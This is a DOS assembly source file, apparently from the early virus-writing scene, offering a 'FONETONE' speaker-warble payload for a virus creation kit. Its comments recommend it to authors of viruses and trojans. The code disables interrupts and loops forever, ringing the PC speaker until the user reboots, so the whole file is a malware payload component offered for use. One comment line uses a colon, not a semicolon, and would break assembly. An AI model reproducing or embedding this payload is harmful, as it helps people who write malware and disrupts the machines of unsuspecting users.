;FONETONE effect for VCL, perhaps appropriate for those who wish to
;program their viruses and trojans to screw with the com port. In any
;case, FONETONE assembles quickly under TASM and produces a sweet, telephone
;warble (on my 80286 12Mhz) which repeats ad nauseum.  
:The code adds about 800 bytes to any virus, so
;use good judgment - the effect is sublime, however. Again, I crooked
;much of this from pd sources which is good a place as any.  Hey,
;whadda you think libraries are for?? -URNST KOUCH

code_seg        segment
        assume  cs:code_seg
        org     100h
        
        jmp     phone_tone

delay    dw     0               ;place to store delay 

phone_tone      proc    near
        
        cli                     ;no interrupts for this baby
go_2:   mov     si,2            ;do two six pulse groups - two times
mainx:  mov     di,2            ;do group of six pulses, two times
mainy:  mov     dx,6            ;do six pulses of each tone
mainz:  mov     bx,2000         ;frequency of first tone
        call    workman         ;go set timer chip and send (bx) to port
        mov     delay,1         ;place first delay count in (delay)       
        call    delayer         ;wait a bit before next tone
        mov     bx,1600         ;frequency of second tone
        call    workman         ;go set timer chip and send (bx) to port
        mov     delay,1         ;place first delay count in (delay)
        call    delayer         ;wait a bit before next time
        dec     dx              ;decrement pulse count
        jnz     mainz           ;have we done six pulses
        dec     di              ;yes go do second group of six pulses
        jnz     mainy           ;have we done two groups
        in      al,61h          ;yes - turn speaker off  
        and     al,11111100b    ;this number turns speaker off
        out     61h,al          ;send it to port
        mov     delay,30        ;place second delay count in delay
        call    delayer         ;wait a while  
        dec     si              ;if si not 0
        jnz     mainx           ;go do two more - six pulse - groups
        sti                     ;enable interrupts (probably could comment out)
        jmp     phone_tone      ;to cancel three-finger-salute reset, but
                                ;ring the fone till the user pukes or reboots
                                ;anyway
phone_tone      endp
;----------------------------------
delayer proc    near
        push    ax           ;save registers
        push    bx
        push    dx
        mov     ah,0         ;want to read time
        int     01ah         ;get initial tick count
        add     dx,delay     ;add our count to tick count  
        mov     bx,dx        ;place it in bx            
delay_it:                  
        int     01ah         ;get reading again
        cmp     dl,bl        ;compare reading to delay count
        jne     delay_it     ;go back and repeat if not equal
        pop     dx
        pop     bx
        pop     ax             ;restore registers
        ret
delayer endp
;--------------------------------------
workman proc  near
        mov     al,10110110b   ;channel 2
        out     43h,al         ;operation mode 3
        mov     ax,bx          ;place freqrency in ax
        out     42h,al         ;send LSB first
        mov     al,ah          ;place MSB in al
        out     42h,al         ;send it next
        in      al,61h         ;get 8255 port contents
        or      al,00000011b   ;this number turns speaker on
        out     61h,al         ;turn it on now
        ret
workman         endp
;----------------------------------
code_seg        ends
     end        phone_tone
     